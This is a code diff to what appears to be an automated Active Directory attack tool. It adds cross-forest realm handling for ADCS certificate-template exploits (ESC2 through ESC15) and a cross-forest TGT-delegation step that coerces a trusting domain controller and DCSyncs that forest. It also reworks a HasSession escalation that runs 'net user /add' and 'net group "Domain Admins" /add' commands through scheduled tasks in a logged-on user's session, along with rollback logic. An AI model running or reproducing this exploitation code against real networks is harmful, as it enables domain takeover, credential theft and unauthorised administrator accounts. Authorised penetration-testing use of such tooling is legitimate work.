@@ -174,7 +174,7 @@ from adscan_internal.services.smb_privilege import (
 from adscan_internal.services.rdp_login_service import scan_rdp_hosts
 from adscan_internal.services.winrm_access_probe_service import probe_winrm_available
 from adscan_internal.integrations.mssql.native_backend import ImpacketMSSQLBackend
-from adscan_internal.workspaces import domain_subpath, write_json_file
+from adscan_internal.workspaces import domain_subpath, resolve_workspace_cwd, write_json_file
 from adscan_internal.models.domain import resolve_dc_ip
 
 
@@ -305,6 +305,92 @@ def _get_stored_domain_credential_for_user(
     return get_stored_domain_credential_for_user(
         getattr(shell, "domains_data", {}), domain=domain, username=username
     )
+
+
+def _resolve_esc_auth_context(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str | None,
+    raw_principal_label: str | None = None,
+) -> tuple[str, str]:
+    """Resolve the (auth_domain, auth_kdc) for an ADCS/ESC execution credential.
+
+    ADCS ESC exploitation is same-domain in the common case (the enrolling
+    principal, the CA, and the issuing DC all in the target ``domain``), so the
+    auth realm equals ``domain``. But cross-forest enrollment is a real ADCS
+    attack: an owned principal in forest A holds enrollment rights on a template
+    published on a CA in trusted forest B. When that happens the credential's own
+    AS-REQ must go to forest A's KDC — minting ``user@A`` against B's KDC yields
+    ``KDC_ERR_C_PRINCIPAL_UNKNOWN`` and the ESC step fails.
+
+    The auth realm is derived, in order, from:
+
+    1. An explicit ``@realm`` / ``REALM\\`` on the executing principal label that
+       differs from ``domain`` (the principal is qualified into a foreign forest).
+    2. The domain under which ``exec_username`` actually has a stored credential,
+       when that is a forest other than ``domain``.
+    3. ``domain`` itself (the common same-forest case).
+
+    Returns ``(auth_domain, auth_kdc)``. The KDC is resolved via the cross-forest
+    SSOT so the auth realm's DC is used; in the same-forest case it is the target
+    domain's PDC, identical to the prior behaviour.
+    """
+    from adscan_internal.services.cross_forest_kdc import (
+        resolve_auth_kdc_for_cross_forest,
+    )
+
+    target_domain = (domain or "").strip()
+    domains_data = getattr(shell, "domains_data", None)
+    if not isinstance(domains_data, dict):
+        domains_data = {}
+
+    auth_domain = target_domain
+
+    # 1. An explicit realm qualifier on the principal label that diverges.
+    label = (raw_principal_label or "").strip()
+    qualified_realm = ""
+    if "@" in label:
+        qualified_realm = label.split("@", 1)[1].strip()
+    elif "\\" in label:
+        qualified_realm = label.split("\\", 1)[0].strip()
+    if qualified_realm and qualified_realm.lower() != target_domain.lower():
+        # Only trust a realm qualifier that names a domain ADscan actually knows.
+        if any(
+            isinstance(k, str) and k.lower() == qualified_realm.lower()
+            for k in domains_data
+        ):
+            auth_domain = qualified_realm
+
+    # 2. Otherwise, find the forest that holds this principal's credential when it
+    #    is NOT the target domain.
+    if auth_domain.lower() == target_domain.lower() and exec_username:
+        normalized = _normalize_account(exec_username)
+        for candidate_domain, candidate_data in domains_data.items():
+            if not isinstance(candidate_domain, str) or not isinstance(
+                candidate_data, dict
+            ):
+                continue
+            if candidate_domain.lower() == target_domain.lower():
+                continue
+            if get_stored_domain_credential_for_user(
+                domains_data, domain=candidate_domain, username=normalized
+            ):
+                auth_domain = candidate_domain
+                break
+
+    auth_kdc = str(
+        resolve_auth_kdc_for_cross_forest(
+            domains_data, auth_domain=auth_domain, target_domain=target_domain
+        )
+        or (
+            domains_data.get(target_domain, {}).get("pdc")
+            if isinstance(domains_data.get(target_domain), dict)
+            else ""
+        )
+        or ""
+    )
+    return auth_domain, auth_kdc
 
 
 def _env_flag_enabled(name: str) -> bool:
@@ -709,11 +795,7 @@ def persist_attack_path_snapshot(
         return
 
     try:
-        workspace_cwd = (
-            shell._get_workspace_cwd()
-            if hasattr(shell, "_get_workspace_cwd")
-            else getattr(shell, "current_workspace_dir", os.getcwd())
-        )
+        workspace_cwd = resolve_workspace_cwd(shell)
         output_path = domain_subpath(
             workspace_cwd,
             shell.domains_dir,
@@ -2104,6 +2186,69 @@ def _summarize_non_actionable_paths(
             continue
         reasons["other"] += 1
     return sum(reasons.values()), reasons
+
+
+def _statuses_excluded_by_filter(
+    summaries: list[dict[str, Any]],
+    *,
+    desired_statuses: set[str] | None,
+) -> list[str]:
+    """Return the distinct path statuses the active status filter excluded.
+
+    The reason buckets only carry a COUNT of filtered paths, which is not
+    enough to tell the operator anything useful. Naming the statuses is what
+    turns "filtered=3" into an explanation and points at the recovery command.
+
+    Args:
+        summaries: The path summaries considered for execution.
+        desired_statuses: The active filter, or ``None`` when unfiltered.
+
+    Returns:
+        The excluded statuses, sorted, without duplicates. Empty when no filter
+        is active or nothing was excluded by it.
+    """
+    if not desired_statuses:
+        return []
+    excluded = {
+        str(summary.get("status") or "theoretical").strip().lower()
+        for summary in summaries
+        if not _status_allowed_by_filter(
+            str(summary.get("status") or "theoretical").strip().lower(),
+            desired_statuses,
+        )
+    }
+    return sorted(status for status in excluded if status)
+
+
+def _print_status_filtered_dead_end(
+    *,
+    domain: str,
+    excluded_statuses: list[str],
+) -> None:
+    """Explain a run where every discovered path was excluded by its status.
+
+    An unattended run only executes paths still at the ``theoretical``
+    baseline, so a workspace that has been executed against before offers
+    nothing — every path already carries an outcome. Without this branch the
+    operator saw the generic "no actionable attack paths" line and a bare
+    ``filtered=3``, with no way to know the run was refusing paths it had
+    already touched, or that a reset re-arms them.
+
+    Args:
+        domain: The target domain, for the recovery command.
+        excluded_statuses: The statuses the filter excluded (already sorted).
+    """
+    status_list = ", ".join(excluded_statuses) or "a non-theoretical status"
+    print_warning(
+        "No attack paths were executed: every discovered path already carries "
+        f"an outcome from a previous run ({status_list}). An unattended run "
+        "only executes paths that have not been tried yet, so it will not "
+        "repeat one automatically."
+    )
+    print_info(
+        "To run them again, clear the recorded outcomes first: "
+        f"`adscan execute reset_attack_path_statuses -d {domain} -w <workspace>`"
+    )
 
 
 def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
@@ -6143,12 +6288,20 @@ def _write_hassession_cleanup_checkpoint(
     exec_password: str,
     user_created_by_us: bool,
     group_candidates: list[str],
+    is_dc_target: bool = True,
 ) -> None:
     """Persist a cleanup checkpoint so HasSession artifacts survive crashes.
 
     Written before the user is added to Domain Admins so that even a crash
     mid-exploitation leaves a recoverable record. Cleared by
     :func:`_clear_hassession_cleanup_checkpoint` after successful rollback.
+
+    ``is_dc_target`` records whether the elevation scope was domain-wide
+    (Domain Admins) or LOCAL to ``target_host`` (Administrators) — a
+    crash-recovery rollback must use the same scope the exploitation used, or
+    it targets the wrong account database (see :func:`_run_hassession_rollback`).
+    Defaults to ``True`` for back-compat with an older on-disk checkpoint
+    written before this field existed (pre-existing behaviour: domain-scoped).
     """
     import json as _json
 
@@ -6168,6 +6321,7 @@ def _write_hassession_cleanup_checkpoint(
         "exec_password": exec_password,
         "user_created_by_us": user_created_by_us,
         "group_candidates": group_candidates,
+        "is_dc_target": is_dc_target,
         "created_at": datetime.now(UTC).isoformat(),
         "rollback_done": False,
     }
@@ -6213,30 +6367,49 @@ def _run_hassession_rollback(
     user_created_by_us: bool,
     group_candidates: list[str],
     non_interactive: bool = False,
+    is_dc_target: bool = True,
 ) -> None:
-    """Remove the HasSession artifact user from the domain.
+    """Remove the HasSession artifact user from the domain (or the host, if local).
 
     Execution order:
-      1. Remove from Domain Admins — ``net group "<DA>" "{user}" /delete /domain``
-         (all candidate group names, so we don't miss a localised DA group).
-      2. If ADscan created the user, delete it — ``net user "{user}" /delete /domain``.
+      1. Remove from the elevated group — ``net group "<DA>" "{user}" /delete /domain``
+         on a DC target (all candidate group names, so we don't miss a localised DA
+         group), or ``net localgroup "Administrators" "{user}" /delete`` on a non-DC
+         (host-local) target.
+      2. If ADscan created the user, delete it — ``net user "{user}" /delete /domain``
+         (DC) or ``net user "{user}" /delete`` (non-DC, host-local account).
+
+    ``is_dc_target`` MUST match the scope the exploitation actually used (threaded
+    from :class:`PrivilegedAccountPlan`'s elevation scope) — reverting a LOCAL
+    account through the domain-scoped verb/flag would target the wrong account
+    database and either no-op or, worse, touch a domain object that was never
+    created.
 
     Both commands run via the same schtask-as channel used during exploitation
-    (session_user's interactive logon session). If the target user has DA creds
-    at this point, those are tried as a fallback for the LDAP delete so the
-    rollback succeeds even if the session user has logged off.
+    (session_user's interactive logon session). On a DC target, if the created
+    user still has DA creds (target_password), those are tried as a fallback for
+    a native LDAP delete so the rollback succeeds even if the session user has
+    logged off — that fallback does not apply to a LOCAL account (there is no
+    domain LDAP object to delete).
     """
     marked_user = mark_sensitive(target_user, "user")
     marked_domain = mark_sensitive(domain, "domain")
+    marked_host = mark_sensitive(target_host, "hostname")
+    scope_desc = marked_domain if is_dc_target else f"{marked_host} (local)"
     print_info(
-        f"[rollback] Removing HasSession artifact {marked_user} from {marked_domain}…"
+        f"[rollback] Removing HasSession artifact {marked_user} from {scope_desc}…"
     )
 
-    # Remove from every candidate DA group (only whichever we actually added
-    # the user to will respond with success; the others will return "not a member",
-    # which we treat as acceptable).
+    domain_flag = " /domain" if is_dc_target else ""
+    group_verb = "group" if is_dc_target else "localgroup"
+
+    # Remove from every candidate elevated group (only whichever we actually
+    # added the user to will respond with success; the others will return
+    # "not a member", which we treat as acceptable).
     for group_name in group_candidates:
-        remove_group_cmd = f'net group "{group_name}" "{target_user}" /delete /domain'
+        remove_group_cmd = (
+            f'net {group_verb} "{group_name}" "{target_user}" /delete{domain_flag}'
+        )
         try:
             ok, output = _run_hassession_schtask_command(
                 shell,
@@ -6274,6 +6447,53 @@ def _run_hassession_rollback(
             telemetry.capture_exception(exc)
             print_warning(f"[rollback] Group removal raised: {exc}")
 
+    # Symmetric with the runtime-membership add above: only a FRESHLY CREATED
+    # account (user_created_by_us) ever had its membership recorded in
+    # memberships.json, so only that case needs the record removed here. A
+    # reused pre-existing account's membership was never attributed to
+    # ADscan in the snapshot, so there is nothing to undo.
+    if user_created_by_us:
+        try:
+            if is_dc_target:
+                from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                    remove_runtime_user_group_membership,
+                )
+
+                for group_name in group_candidates:
+                    remove_runtime_user_group_membership(
+                        shell,
+                        domain,
+                        username=target_user,
+                        group_name=group_name,
+                        source="hassession_attack_step",
+                        origin_relation="AddMember",
+                    )
+            else:
+                from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
+                    update_edge_status_by_labels,
+                )
+
+                update_edge_status_by_labels(
+                    shell,
+                    domain,
+                    from_label=target_user,
+                    relation="AdminTo",
+                    to_label=target_host,
+                    status="success",
+                    notes={
+                        "cleanup_pending": False,
+                        "cleanup_status": "success",
+                        "cleanup_kind": "hassession_account_deleted",
+                    },
+                )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+            print_info_debug(
+                "[rollback] Could not update the runtime membership snapshot "
+                f"for {marked_user}."
+            )
+
     if not user_created_by_us:
         print_info_debug(
             f"[rollback] User {marked_user} was pre-existing — skip account deletion."
@@ -6281,7 +6501,7 @@ def _run_hassession_rollback(
         return
 
     # Delete the account we created.
-    delete_cmd = f'net user "{target_user}" /delete /domain'
+    delete_cmd = f'net user "{target_user}" /delete{domain_flag}'
     deleted = False
 
     # Primary: run as session_user (schtask channel)
@@ -6297,7 +6517,10 @@ def _run_hassession_rollback(
             log_suffix="rollback_delusr",
         )
         if ok:
-            print_info(f"[rollback] Account {marked_user} deleted from domain.")
+            print_info(
+                f"[rollback] Account {marked_user} deleted "
+                + ("from domain." if is_dc_target else f"from {marked_host}.")
+            )
             deleted = True
         else:
             print_warning(
@@ -6310,8 +6533,10 @@ def _run_hassession_rollback(
 
     # Fallback: if the created user has DA creds (target_password), try a direct
     # native LDAP delete so the rollback succeeds even if the session user has
-    # logged off by this point.
-    if not deleted and target_password:
+    # logged off by this point. LDAP-deleting a domain object only makes sense
+    # for a DC-scoped (domain) account — a LOCAL account has no domain LDAP
+    # object to delete, so this fallback is skipped for a non-DC target.
+    if not deleted and target_password and is_dc_target:
         try:
             from adscan_internal.services.native_account_cleanup import (
                 delete_domain_account_via_ldap,
@@ -6334,7 +6559,7 @@ def _run_hassession_rollback(
     if not deleted:
         print_warning(
             f"[rollback] Could not delete {marked_user} — manual cleanup required: "
-            f"net user {target_user} /delete /domain"
+            f"net user {target_user} /delete{domain_flag}"
         )
 
 
@@ -6396,8 +6621,55 @@ def _check_hassession_pending_cleanup(shell: Any, *, domain: str) -> None:
             user_created_by_us=bool(data.get("user_created_by_us", True)),
             group_candidates=list(data.get("group_candidates") or []),
             non_interactive=True,
+            # Older checkpoints predate this field — default True preserves
+            # their pre-existing (domain-scoped) rollback behaviour exactly.
+            is_dc_target=bool(data.get("is_dc_target", True)),
         )
         _clear_hassession_cleanup_checkpoint(shell, domain=domain)
+
+
+def _is_user_local_admin_via_net(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str,
+    exec_password: str,
+    target_host: str,
+    session_user: str,
+    target_user: str,
+) -> bool | None:
+    """Verify local Administrators membership by re-querying ``net localgroup``.
+
+    Non-DC counterpart to :func:`_is_user_domain_admin_via_sid` — the target
+    account/group is LOCAL to ``target_host`` (a machine-SID-relative RID, not
+    the domain-SID-relative RID 512), so membership cannot be verified via LDAP
+    against the domain; it is re-queried over the same schtask-as channel used
+    for the elevation itself. Returns ``None`` on an inconclusive/failed probe
+    (never treated as a definitive "not a member").
+    """
+    try:
+        ok, output = _run_hassession_schtask_command(
+            shell,
+            domain=domain,
+            exec_username=exec_username,
+            exec_password=exec_password,
+            target_host=target_host,
+            session_user=session_user,
+            command_to_run="net localgroup Administrators",
+            log_suffix="verify_local_admins",
+        )
+        if not ok:
+            return None
+        return target_user.lower() in (output or "").lower()
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        marked_user = mark_sensitive(target_user, "user")
+        marked_host = mark_sensitive(target_host, "hostname")
+        print_info_debug(
+            "[hassession] Failed to verify local Administrators membership for "
+            f"{marked_user}@{marked_host}: {exc}"
+        )
+        return None
 
 
 def _is_user_domain_admin_via_sid(
@@ -11499,12 +11771,18 @@ def execute_selected_attack_path(
                         _resolve_template_min_key_size,
                     )
 
+                    esc2_auth_domain, esc2_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=2,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc2_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc2_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -11658,12 +11936,18 @@ def execute_selected_attack_path(
                         _resolve_template_min_key_size,
                     )
 
+                    esc6_auth_domain, esc6_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=6,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc6_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc6_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -11801,12 +12085,18 @@ def execute_selected_attack_path(
                     from adscan_internal.services.adcs.esc_runner import run_esc_sync
                     from adscan_internal.services.adcs.esc_types import EscConfig
 
+                    esc7_auth_domain, esc7_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=7,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc7_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc7_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -11946,12 +12236,18 @@ def execute_selected_attack_path(
                     from adscan_internal.services.adcs.esc_runner import run_esc_sync
                     from adscan_internal.services.adcs.esc_types import EscConfig
 
+                    esc8_auth_domain, esc8_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=esc_number,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc8_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc8_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=ca_host,
                         ca_name=str(domain_data.get("ca") or ""),
                         template=template,
@@ -11992,6 +12288,89 @@ def execute_selected_attack_path(
                     )
                     if esc8_result.pfx_path and hasattr(shell, "ptc_certipy"):
                         shell.ptc_certipy(domain, esc8_result.pfx_path)
+                continue
+
+            # Cross-forest cross-org TGT delegation — coerce a DC of the TRUSTING
+            # forest to Kerberos-auth to a name whose SPN key we hold (the trusted
+            # DC machine account, from DCSyncing the compromised forest), capture
+            # its forwarded TGT, and DCSync the trusting forest. Terminal edge
+            # (compromised-domain node -> trusting-domain node).
+            if key == "crossorgtgtdelegation":
+                action_name = action or "CrossOrgTgtDelegation"
+                if not from_label or not to_label:
+                    print_warning(
+                        f"Cannot execute {action_name}: missing from/to details."
+                    )
+                    return execution_started
+                # to = trusting forest (DCSync target); from = compromised forest.
+                trusting_domain = (
+                    _attack_path_label_to_name(to_label)
+                    or str(details.get("trusting_domain") or "")
+                ).strip()
+                service_domain = (
+                    _attack_path_label_to_name(from_label)
+                    or str(details.get("compromised_domain") or "")
+                ).strip()
+                if not trusting_domain or not service_domain:
+                    _mark_blocked_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason=(
+                            "Could not resolve the trusting/compromised domains for "
+                            "cross-org TGT delegation"
+                        ),
+                    )
+                    return execution_started
+                from adscan_internal.services.cross_forest_tgt_delegation_step import (  # noqa: PLC0415
+                    run_cross_org_tgt_delegation_step,
+                )
+
+                crossorg_result = asyncio.run(
+                    run_cross_org_tgt_delegation_step(
+                        shell,
+                        trusting_domain=trusting_domain,
+                        service_domain=service_domain,
+                        workspace_dir=_resolve_workspace_dir(shell, service_domain),
+                    )
+                )
+                if not crossorg_result.success:
+                    # Honest neutral outcome — never a defence claim (an NTLM
+                    # capture / coercion-connectivity failure is a data gap).
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action_name,
+                            to_label=to_label,
+                            status="attempted",
+                            notes={"reason": crossorg_result.error or "unknown"},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    return execution_started
+                try:
+                    update_edge_status_by_labels(
+                        shell,
+                        domain,
+                        from_label=from_label,
+                        relation=action_name,
+                        to_label=to_label,
+                        status="exploited",
+                        notes={
+                            "forwarded_principal": crossorg_result.forwarded_principal
+                            or "",
+                            "compromised_domain": trusting_domain,
+                        },
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                print_info(
+                    "Cross-forest escalation via cross-org TGT delegation succeeded: "
+                    f"{mark_sensitive(trusting_domain, 'domain')} replicated."
+                )
                 continue
 
             # NTLMv1 coerce→relay→(RBCD|ShadowCreds) — sub-project #3. The relay
@@ -12269,12 +12648,18 @@ def execute_selected_attack_path(
                         _resolve_template_min_key_size,
                     )
 
+                    esc9_auth_domain, esc9_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=9,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc9_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc9_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -12425,12 +12810,18 @@ def execute_selected_attack_path(
                         _resolve_template_min_key_size,
                     )
 
+                    esc14_auth_domain, esc14_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=14,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc14_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc14_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -12586,12 +12977,18 @@ def execute_selected_attack_path(
                         _resolve_template_min_key_size,
                     )
 
+                    esc15_auth_domain, esc15_auth_kdc = _resolve_esc_auth_context(
+                        shell,
+                        domain=domain,
+                        exec_username=exec_username,
+                        raw_principal_label=from_label,
+                    )
                     esc_cfg = EscConfig(
                         esc=15,
                         domain=domain,
-                        auth_domain=domain,
+                        auth_domain=esc15_auth_domain,
                         dc_ip=str(domain_data.get("pdc") or ""),
-                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        auth_kdc=esc15_auth_kdc or str(domain_data.get("pdc") or ""),
                         ca_host=str(
                             domain_data.get("adcs")
                             or domain_data.get("pdc_hostname")
@@ -12874,37 +13271,76 @@ def execute_selected_attack_path(
                     )
 
                 non_interactive = is_non_interactive(shell)
-                create_new_user = True
-                if not non_interactive and hasattr(shell, "_questionary_select"):
-                    options = [
-                        "Create new domain user, then add to Domain Admins (Recommended)",
-                        "Add existing domain user to Domain Admins",
-                        "Cancel",
-                    ]
-                    choice = shell._questionary_select(
-                        "HasSession exploitation mode:",
-                        options,
-                        default_idx=0,
-                    )
-                    if choice is None or choice >= len(options) - 1:
-                        return execution_started
-                    create_new_user = choice == 0
-                elif not non_interactive:
-                    create_new_user = Confirm.ask(
-                        "Create a new domain user and add it to Domain Admins?",
-                        default=True,
-                    )
+
+                # Create-new-vs-reuse-an-owned + elevation SCOPE, routed through
+                # the shared SSOT (privileged_account_provisioning.py) so this
+                # follow-up matches the same operator choice the MSSQL
+                # SYSTEM-escalation follow-up offers, and — the actual bug fix —
+                # the elevation target is no longer hardcoded to Domain Admins:
+                # a non-DC session host resolves to the host's LOCAL
+                # Administrators group instead (a HasSession target is very
+                # often a member server, not a DC).
+                from adscan_internal.services.privileged_account_provisioning import (  # noqa: PLC0415
+                    ProvisioningAction,
+                    plan_privileged_account,
+                )
+
+                default_user = _generate_default_hassession_username()
+                # New account does not exist yet (no per-user PSO), so resolve
+                # the domain-default policy (target_user=None) and generate a
+                # compliant password through the canonical generator.
+                new_user_policy = _resolve_password_policy_for_execution(
+                    shell,
+                    domain=domain,
+                    target_user=None,
+                    username=exec_username,
+                    password=password,
+                )
+                default_generated_password = generate_compliant_password(
+                    new_user_policy, machine=False
+                )
+                stored_creds = (
+                    getattr(shell, "domains_data", {})
+                    .get(domain, {})
+                    .get("credentials", {})
+                )
+                reuse_pool = (
+                    {
+                        str(user): str(secret or "")
+                        for user, secret in stored_creds.items()
+                        if isinstance(user, str)
+                        and _is_valid_domain_username(_normalize_account(user))
+                        and str(user).strip().lower() != exec_username.strip().lower()
+                    }
+                    if isinstance(stored_creds, dict)
+                    else {}
+                )
+
+                plan = plan_privileged_account(
+                    shell,
+                    domain=domain,
+                    target_host=target_host,
+                    default_account_name=default_user,
+                    default_account_secret=default_generated_password,
+                    domains_data=getattr(shell, "domains_data", None),
+                    reuse_pool=reuse_pool,
+                    prompt_title="HasSession exploitation mode",
+                )
+                if plan.is_cancelled:
+                    return execution_started
+
+                create_new_user = plan.action is ProvisioningAction.CREATE_NEW
+                is_dc_target = plan.elevation.is_domain_wide
 
                 target_user = ""
                 target_password: str | None = None
                 if create_new_user:
-                    default_user = _generate_default_hassession_username()
                     if non_interactive:
-                        selected_user = default_user
+                        selected_user = plan.account_name
                     else:
                         selected_user = Prompt.ask(
                             "New domain username to create",
-                            default=default_user,
+                            default=plan.account_name,
                         ).strip()
                     selected_user = _normalize_account(selected_user)
                     if not _is_valid_domain_username(selected_user):
@@ -12914,19 +13350,7 @@ def execute_selected_attack_path(
                         )
                         return execution_started
 
-                    # New account does not exist yet (no per-user PSO), so resolve
-                    # the domain-default policy (target_user=None) and generate a
-                    # compliant password through the canonical generator.
-                    new_user_policy = _resolve_password_policy_for_execution(
-                        shell,
-                        domain=domain,
-                        target_user=None,
-                        username=exec_username,
-                        password=password,
-                    )
-                    generated_password = generate_compliant_password(
-                        new_user_policy, machine=False
-                    )
+                    generated_password = plan.account_secret or default_generated_password
                     if non_interactive:
                         selected_password = generated_password
                     else:
@@ -12947,63 +13371,37 @@ def execute_selected_attack_path(
                     target_user = selected_user
                     target_password = selected_password
                 else:
-                    stored_creds = (
-                        getattr(shell, "domains_data", {})
-                        .get(domain, {})
-                        .get("credentials", {})
-                    )
-                    credential_users = (
-                        sorted(
-                            {
-                                str(user).strip()
-                                for user in stored_creds.keys()
-                                if isinstance(user, str)
-                                and _is_valid_domain_username(_normalize_account(user))
-                            },
-                            key=str.lower,
-                        )
-                        if isinstance(stored_creds, dict)
-                        else []
-                    )
-                    if non_interactive:
-                        selected_user = exec_username
-                    elif hasattr(shell, "_questionary_select") and credential_users:
-                        options = credential_users + ["Enter username", "Cancel"]
-                        selected_idx = shell._questionary_select(
-                            "Select the user to elevate to Domain Admins:",
-                            options,
-                            default_idx=0,
-                        )
-                        if selected_idx is None or selected_idx >= len(options) - 1:
-                            return execution_started
-                        if selected_idx == len(options) - 2:
-                            selected_user = Prompt.ask(
-                                "Existing username to add to Domain Admins",
-                                default=exec_username,
-                            ).strip()
-                        else:
-                            selected_user = options[selected_idx]
-                    else:
-                        selected_user = Prompt.ask(
-                            "Existing username to add to Domain Admins",
-                            default=exec_username,
-                        ).strip()
-                    target_user = _normalize_account(selected_user)
+                    target_user = _normalize_account(plan.account_name)
                     if not _is_valid_domain_username(target_user):
                         print_warning(
                             "Cannot execute HasSession: invalid target username."
                         )
                         return execution_started
+                    target_password = plan.account_secret
 
-                group_candidates = _resolve_domain_admin_group_candidates(shell, domain)
-                if not group_candidates:
-                    group_candidates = ["Domain Admins", "Admins. del dominio"]
+                if is_dc_target:
+                    group_candidates = _resolve_domain_admin_group_candidates(
+                        shell, domain
+                    )
+                    if not group_candidates:
+                        group_candidates = ["Domain Admins", "Admins. del dominio"]
+                else:
+                    # Non-DC target: the account is LOCAL to target_host, so the
+                    # only reachable elevation is the host's own BUILTIN\Administrators
+                    # group — a domain-SID-relative RID lookup (resolve_group_name_by_rid)
+                    # does not apply to a machine-local group.
+                    group_candidates = [plan.elevation.group_name]
 
                 marked_host = mark_sensitive(target_host, "hostname")
                 marked_session_user = mark_sensitive(session_user, "user")
                 marked_exec_user = mark_sensitive(exec_username, "user")
                 marked_target_user = mark_sensitive(target_user, "user")
                 mode_label = "create+addmember" if create_new_user else "addmember"
+                scope_label = (
+                    "Domain Admins (domain-wide)"
+                    if is_dc_target
+                    else "local Administrators (host-local, not domain-wide)"
+                )
                 print_panel(
                     "\n".join(
                         [
@@ -13012,6 +13410,7 @@ def execute_selected_attack_path(
                             f"Session user: {marked_session_user}",
                             f"Executor: {marked_exec_user}",
                             f"Mode: {mode_label}",
+                            f"Elevation scope: {scope_label}",
                             f"Target user: {marked_target_user}",
                         ]
                     ),
@@ -13086,10 +13485,19 @@ def execute_selected_attack_path(
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
+                    # DC target -> "net user .../add /domain" creates a DOMAIN
+                    # account and "net group" adds to a domain global group.
+                    # Non-DC target -> the account is LOCAL to target_host, so
+                    # the domain-scoped verb/flag would silently create/modify
+                    # a domain object instead of the intended local one — use
+                    # the plain (no /domain) form + "net localgroup".
+                    domain_flag = " /domain" if is_dc_target else ""
+                    group_verb = "group" if is_dc_target else "localgroup"
+
                     command_failed = False
                     if create_new_user and target_password is not None:
                         create_command = (
-                            f'net user "{target_user}" "{target_password}" /add /domain'
+                            f'net user "{target_user}" "{target_password}" /add{domain_flag}'
                         )
                         create_ok, create_output = _run_hassession_schtask_command(
                             shell,
@@ -13117,6 +13525,7 @@ def execute_selected_attack_path(
                                 exec_password=password,
                                 user_created_by_us=True,
                                 group_candidates=group_candidates,
+                                is_dc_target=is_dc_target,
                             )
                         else:
                             lowered = create_output.lower()
@@ -13145,7 +13554,8 @@ def execute_selected_attack_path(
                     if not command_failed:
                         for group_name in group_candidates:
                             add_command = (
-                                f'net group "{group_name}" "{target_user}" /add /domain'
+                                f'net {group_verb} "{group_name}" "{target_user}" '
+                                f'/add{domain_flag}'
                             )
                             add_ok, _ = _run_hassession_schtask_command(
                                 shell,
@@ -13167,12 +13577,24 @@ def execute_selected_attack_path(
                                     target_user=target_user,
                                 )
                                 waited_for_membership = True
-                            membership = _is_user_domain_admin_via_sid(
-                                shell,
-                                domain=domain,
-                                target_user=target_user,
-                                auth_username=exec_username,
-                                auth_password=password,
+                            membership = (
+                                _is_user_domain_admin_via_sid(
+                                    shell,
+                                    domain=domain,
+                                    target_user=target_user,
+                                    auth_username=exec_username,
+                                    auth_password=password,
+                                )
+                                if is_dc_target
+                                else _is_user_local_admin_via_net(
+                                    shell,
+                                    domain=domain,
+                                    exec_username=exec_username,
+                                    exec_password=password,
+                                    target_host=target_host,
+                                    session_user=session_user,
+                                    target_user=target_user,
+                                )
                             )
                             if membership is True:
                                 verified_da = True
